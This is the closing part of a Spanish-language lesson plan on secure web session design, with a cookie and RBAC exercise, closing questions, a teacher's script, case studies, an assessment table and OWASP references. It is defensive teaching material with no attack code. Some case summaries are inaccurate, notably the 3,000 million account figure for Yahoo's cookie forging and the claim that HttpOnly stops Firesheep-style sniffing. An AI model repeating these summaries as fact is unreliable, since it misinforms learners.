**EJERCICIO: Diseña la Arquitectura de Seguridad de Sesiones**

Para el sistema de tu proyecto grupal (o para un portal e-commerce si no tienen definido), completa la siguiente tabla:

| # | Decisión de Diseño | Tu Respuesta |
|:---:|---|---|
| 1 | Atributos de la cookie de sesión (todos los necesarios) | |
| 2 | ¿Dónde almacenas las sesiones en el servidor? | |
| 3 | Tiempo de timeout por inactividad (justifica) | |
| 4 | Roles del sistema (mínimo 3) | |
| 5 | Permisos de cada rol (mínimo 3 por rol) | |
| 6 | ¿Cómo implementas el logout seguro? (dos pasos) | |
| 7 | ¿Cómo previenes Session Fixation? (una acción) | |
| 8 | ¿Dónde NO debes almacenar el rol del usuario? | |

Además, escribe el pseudocódigo o código real del decorador `@require_role` que usarías.

**Criterio de éxito:** Tus respuestas son coherentes con los atributos de T3 y el código de T5.

---

## 5. CIERRE {#cierre}

### a) Síntesis Colaborativa (4 min)

*Seleccionar estudiantes al azar. Construir el resumen en la pizarra con sus respuestas.*

**Pregunta C1:**
> "En una frase: ¿por qué una sesión mal configurada puede ser más peligrosa que una contraseña débil?"

**→ Respuesta esperada:** Porque la contraseña se expone solo en el login (segundos), pero la sesión dura horas. Si está mal configurada, el atacante suplanta al usuario sin necesitar su contraseña — solo la cookie.

---

**Pregunta C2:**
> "Los tres atributos de cookie más críticos y el ataque que previene cada uno."

**→ Respuesta esperada:** HttpOnly → XSS. Secure → Sniffing / MITM. SameSite=Lax → CSRF.

---

**Pregunta C3:**
> "Regla de oro del RBAC: ¿de dónde NUNCA viene el rol del usuario?"

**→ Respuesta esperada:** Del cliente (URL, formulario, cookie editable). Siempre del servidor, almacenado en la sesión del servidor.

---

### b) Metacognición (3 min)

> "Cierren los ojos 30 segundos. Piensen en el sistema web que más usaron hoy. ¿Cuántos de los problemas de hoy creen que tiene? ¿Qué cambiarían si fueran el desarrollador? ¿Hay algo que no terminaron de entender? Escríbanlo en su cuaderno — es para ustedes."

---

### c) Tarea y Puente hacia S4 (3 min)

> "La semana que viene es la Evaluación Parcial sobre Diseño y Selección de Controles. Lo que vieron hoy — RBAC, atributos de cookies, prevención de hijacking — son exactamente los controles A01, A05 y A07 de OWASP.
>
> **Tarea para S4:** Completar el Laboratorio en Casa de S3 (sistema Flask con sesiones y RBAC funcionales). Traer el proyecto con sesiones seguras implementadas. Revisar OWASP A01 y A05 en cheatsheetseries.owasp.org."

---

## Guion Verbal Sugerido {#guion}

**Transición T3 → T4:**
> "Hemos visto cómo configurar cookies correctamente. Ahora viene la pregunta incómoda: ¿qué hace un atacante cuando estas configuraciones NO están? Vamos a ver dos ataques reales — no para aprender a atacar, sino para entender exactamente qué estamos defendiendo."

**Introducir código RBAC:**
> "Este decorador tiene 8 líneas. Esas 8 líneas son la diferencia entre un sistema donde cualquier usuario puede acceder a datos de administrador, y un sistema donde eso es imposible. La seguridad bien diseñada no es compleja — es metódica."

**Cerrar el caso práctico:**
> "El sistema UniSegura tenía 8 problemas de seguridad. Ocho. Y ninguno era sofisticado. Eran errores de configuración y diseño básicos. El 80% de las brechas reales son así — no son hackers genios, son desarrolladores que no conocían estas reglas. Ustedes ya las conocen."

---

## Casos Reales Recomendados {#casos}

**Caso 1 — Firesheep (2010):** Extensión Firefox que robaba sesiones de 28 sitios en WiFi pública. Forzó HTTPS completo en Facebook, Twitter, Amazon. Lección: Secure + HttpOnly previenen esto completamente.

**Caso 2 — GitHub Session Fixation (2012):** Atacante podía fijar un session_id antes del login. Lección: `session.clear()` después del login exitoso.

**Caso 3 — Yahoo! Cookie Forging (2016):** Hackers crearon cookies de autenticación falsas para 3,000 millones de cuentas. Lección: El Session ID debe ser criptográficamente aleatorio con suficiente entropía.

**Caso 4 — Twitter Logout Bug (2020):** Sesiones permanecían activas en otros dispositivos después del logout. Lección: El logout debe invalidar el ID en el servidor, no solo en el cliente.

**Caso 5 — WordPress XSS → Cookie Theft:** Plugins vulnerables a XSS permitían robar cookies de administradores. Lección: HttpOnly impide que XSS extraiga la cookie aunque ejecute código JavaScript.

---

## Evaluación Formativa {#evaluacion}

| Instrumento | Momento | Indicador de logro |
|---|---|---|
| Preguntas orales T1–T5 | Transformación | Responde con términos técnicos correctos |
| Mini actividad DevTools | Minuto 15 | Identifica cookies y localStorage en navegador |
| Caso grupal | Práctica | Identifica ≥6 de los 8 problemas del escenario |
| Ejercicio individual | Práctica | Completa la tabla con atributos y roles correctos |
| Preguntas de cierre | Cierre | Resume 3 atributos y regla RBAC correctamente |

---

## Referencias APA 7 {#referencias}

OWASP Foundation. (2021). *A01:2021 – Broken access control*. https://owasp.org/Top10/A01_2021-Broken_Access_Control/

OWASP Foundation. (2021). *A05:2021 – Security misconfiguration*. https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

OWASP Foundation. (2023). *Session management cheat sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

Mozilla Developer Network. (2024). *Using HTTP cookies*. https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

NIST. (2020). *SP 800-63B: Digital identity guidelines – Authentication and lifecycle management*. https://pages.nist.gov/800-63-3/sp800-63b.html

Stallings, W., & Brown, L. (2018). *Computer security: Principles and practice* (4th ed.). Pearson.

Stuttard, D., & Pinto, M. (2011). *The web application hacker's handbook* (2nd ed.). Wiley.

---

## Recursos y Links {#recursos}

| Recurso | Link |
|---|---|
| OWASP Session Management CheatSheet | https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html |
| MDN — HTTP Cookies | https://developer.mozilla.org/es/docs/Web/HTTP/Cookies |
| Flask Security Docs | https://flask.palletsprojects.com/en/3.0.x/security/ |
| OWASP ZAP (scanner gratuito) | https://www.zaproxy.org/ |
| Burp Suite Community | https://portswigger.net/burp/communitydownload |
| PortSwigger Web Security Academy (gratis) | https://portswigger.net/web-security/authentication |
| Flask-Login GitHub | https://github.com/maxcountryman/flask-login |
| DVWA (app vulnerable para practicar) | https://github.com/digininja/DVWA |
